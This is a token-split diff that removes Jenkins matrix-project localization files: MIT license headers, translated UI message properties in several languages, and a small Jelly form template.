"Definido", "pelo", "Usu", "\\", "u00e1rio", "@", "@", "-", "1", ",", "30", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Mike", "Salnikov", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "MatrixProject", ".", "DisplayName", "=", "\\", "u041c", "\\", "u0443", "\\", "u043b", "\\", "u044c", "\\", "u0442", "\\", "u0438", "\\", "u043a", "\\", "u043e", "\\", "u043d", "\\", "u0444", "\\", "u0438", "\\", "u0433", "\\", "u0443", "\\", "u0440", "\\", "u0430", "\\", "u0446", "\\", "u0438", "\\", "u043e", "\\", "u043d", "\\", "u043d", "\\", "u044b", "\\", "u0439", "\\", "u043f", "\\", "u0440", "\\", "u043e", "\\", "u0435", "\\", "u043a", "\\", "u0442", "MatrixBuild", ".", "Triggering", "=", "\\", "u0410", "\\", "u043a", "\\", "u0442", "\\", "u0438", "\\", "u0432", "\\", "u0438", "\\", "u0440", "\\", "u0443", "\\", "u044e", "{", "0", "}", "MatrixBuild", ".", "AppearsCancelled", "=", "{", "0", "}", "\\", "u043f", "\\", "u043e", "\\", "u0432", "\\", "u0441", "\\", "u0435", "\\", "u0439", "\\", "u0432", "\\", "u0438", "\\", "u0434", "\\", "u0438", "\\", "u043c", "\\", "u043e", "\\", "u0441", "\\", "u0442", "\\", "u0438", "\\", "u043f", "\\", "u0440", "\\", "u0435", "\\", "u0440", "\\", "u0432", "\\", "u0430", "\\", "u043d", "\\", "u0430", "MatrixBuild", ".", "Cancelled", "=", "\\", "u041f", "\\", "u0440", "\\", "u0435", "\\", "u0440", "\\", "u0432", "\\", "u0430", "\\", "u043d", "\\", "u0430", "{", "0", "}", "MatrixBuild", ".", "Interrupting", "=", "\\", "u041f", "\\", "u0440", "\\", "u0435", "\\", "u0440", "\\", "u044b", "\\", "u0432", "\\", "u0430", "\\", "u044e", "{", "0", "}", "MatrixConfiguration", ".", "Pronoun", "=", "\\", "u041a", "\\", "u043e", "\\", "u043d", "\\", "u0444", "\\", "u0438", "\\", "u0433", "\\", "u0443", "\\", "u0440", "\\", "u0430", "\\", "u0446", "\\", "u0438", "\\", "u044f", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Oguz", "Dag", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "MatrixProject", ".", "DisplayName", "=", "\\", "u00c7oklu", "-", "konfig", "\\", "u00fcrasyona", "sahip", "proje", "yap", "\\", "u0131land", "\\", "u0131r", "MatrixBuild", ".", "Triggering", "=", "{", "0", "}", "tetikleniyor", "MatrixBuild", ".", "AppearsCancelled", "=", "{", "0", "}", "iptal", "edilmi", "\\", "u015f", "g", "\ufffd", "r", "\\", "u00fcn", "\\", "u00fcyor", "MatrixBuild", ".", "Cancelled", "=", "{", "0", "}", "iptal", "edildi", "MatrixBuild", ".", "Interrupting", "=", "{", "0", "}", "i", "\\", "u015flemi", "kesiliyor", "MatrixConfiguration", ".", "Pronoun", "=", "Konfig", "\\", "u00fcrasyon", "MatrixRun", ".", "KeptBecauseOfParent", "=", "{", "0", "}", "tutuldu", "\\", "u011fu", "i", "\\", "u00e7in", "tutulmu", "\\", "u015ftur", "@", "@", "-", "1", ",", "37", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "id", ":", "cactusman", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "MatrixProject", ".", "DisplayName", "=", "\\", "u6784", "\\", "u5efa", "\\", "u4e00", "\\", "u4e2a", "\\", "u591a", "\\", "u914d", "\\", "u7f6e", "\\", "u9879", "\\", "u76ee", "MatrixProject", ".", "DuplicateAxisName", "=", "Duplicate", "axis", "name", "MatrixBuild", ".", "Triggering", "=", "Triggering", "{", "0", "}", "MatrixBuild", ".", "AppearsCancelled", "=", "{", "0", "}", "appears", "to", "be", "cancelled", "MatrixBuild", ".", "Cancelled", "=", "Cancelled", "{", "0", "}", "MatrixBuild", ".", "Interrupting", "=", "Interrupting", "{", "0", "}", "MatrixConfiguration", ".", "Pronoun", "=", "Configuration", "MatrixRun", ".", "KeptBecauseOfParent", "=", "Kept", "because", "{", "0", "}", "is", "kept", "JDKAxis", ".", "DisplayName", "=", "JDK", "LabelAxis", ".", "DisplayName", "=", "Slaves", "TextArea", ".", "DisplayName", "=", "User", "-", "defined", "Axis", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2013", ",", "Chunghwa", "Telecom", "Co", ".", ",", "Ltd", ".", ",", "Pei", "-", "Tang", "Huang", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "MatrixProject", ".", "DisplayName", "=", "\\", "u5efa", "\\", "u7acb", "\\", "u591a", "\\", "u91cd", "\\", "u8a2d", "\\", "u5b9a", "\\", "u5c08", "\\", "u6848", "MatrixProject", ".", "DuplicateAxisName", "=", "\\", "u8ef8", "\\", "u7dda", "\\", "u540d", "\\", "u7a31", "\\", "u91cd", "\\", "u8907", "MatrixBuild", ".", "Triggering", "=", "\\", "u89f8", "\\", "u767c", "{", "0", "}", "\\", "u4e2d", "MatrixBuild", ".", "AppearsCancelled", "=", "{", "0", "}", "\\", "u6b63", "\\", "u88ab", "\\", "u53d6", "\\", "u6d88", "MatrixBuild", ".", "Cancelled", "=", "{", "0", "}", "\\", "u5df2", "\\", "u53d6", "\\", "u6d88", "MatrixBuild", ".", "Interrupting", "=", "\\", "u4e2d", "\\", "u65b7", "{", "0", "}", "\\", "u4e2d", "MatrixBuild", ".", "Completed", "=", "{", "0", "}", "\\", "u5df2", "\\", "u5b8c", "\\", "u6210", "\\", "uff0c", "\\", "u7d50", "\\", "u679c", "\\", "u70ba", "{", "1", "}", "MatrixConfiguration", ".", "Pronoun", "=", "\\", "u8a2d", "\\", "u5b9a", "MatrixRun", ".", "KeptBecauseOfParent", "=", "\\", "u70ba", "\\", "u4e86", "{", "0", "}", "\\", "u800c", "\\", "u4fdd", "\\", "u7559", "JDKAxis", ".", "DisplayName", "=", "JDK", "LabelAxis", ".", "DisplayName", "=", "Slave", "LabelExpAxis", ".", "DisplayName", "=", "\\", "u6a19", "\\", "u7c64", "\\", "u8868", "\\", "u793a", "\\", "u5f0f", "TextArea", ".", "DisplayName", "=", "\\", "u4f7f", "\\", "u7528", "\\", "u8005", "\\", "u81ea", "\\", "u8a02", "\\", "u8ef8", "@", "@", "-", "1", ",", "32", "+", "0", ",", "0", "@", "@", "<", "!", "The", "MIT", "License", "Copyright", "(", "c", ")", "2010", ",", "InfraDNA", ",", "Inc", ".", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "THE", "SOFTWARE", ".", ">", "<", "?", "jelly", "escape", "-", "by", "-", "default", "=", "'", "true", "'", "?>", "<", "j", ":", "jelly", "xmlns", ":", "j", "=", "\"", "jelly", ":", "core", "\"", "xmlns", ":", "st", "=", "\"", "jelly", ":", "stapler", "\"", "xmlns", ":", "d", "=", "\"", "jelly", ":", "define", "\"", "xmlns", ":", "l", "=", "\"/", "lib", "/", "layout", "\"", "xmlns", ":", "t", "=", "\"/", "lib", "/", "hudson", "\"", "xmlns", ":", "f", "=", "\"/", "lib", "/", "form", "\"", "xmlns", ":", "i", "=", "\"", "jelly", ":", "fmt", "\"", "xmlns", ":", "p", "=", "\"/", "lib", "/", "hudson", "/", "project", "\"", ">", "<", "f", ":", "entry", "title", "=", "\"$", "{%", "Name", "}", "\"", "field", "=", "\"", "name", "\"", ">", "<", "f", ":", "textbox", "/", ">", "<", "/", "f", ":", "entry", ">", "<", "f", ":", "entry", "title", "=", "\"$", "{%", "Values", "}", "\"", "field", "=", "\"", "valueString", "\"", ">", "<", "f", ":", "expandableTextbox", "/", ">", "<", "/", "f", ":", "entry", ">", "<", "/", "j", ":", "jelly", ">", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "Kohsuke", "Kawaguchi", ".", "Knud", "Poulsen", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Values", "=", "V", "\\", "u00e6rdier", "Name", "=", "Navn", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", ",", "Kohsuke", "Kawaguchi", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "and", "a", "number", "of", "other", "of", "contributers", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Values", "=", "Werte", "Name", "=", "Name", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", ",", "Kohsuke", "Kawaguchi", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "and", "a", "number", "of", "other", "of", "contributers", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Values", "=", "Valores", "Name", "=", "Nombre", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Seiji", "Sogabe", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Name", "=", "\\", "u540d", "\\", "u524d", "Values", "=", "\\", "u5024", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", ",", "Kohsuke", "Kawaguchi", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "and", "a", "number", "of", "other", "of", "contributers", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Values", "=", "Valores", "Name", "=", "Nome", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2013", ",", "Chunghwa", "Telecom", "Co", ".", ",", "Ltd", ".", ",", "Pei", "-", "Tang", "Huang", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Name", "=", "\\", "u540d", "\\", "u7a31", "Values", "=", "\\", "u503c", "@", 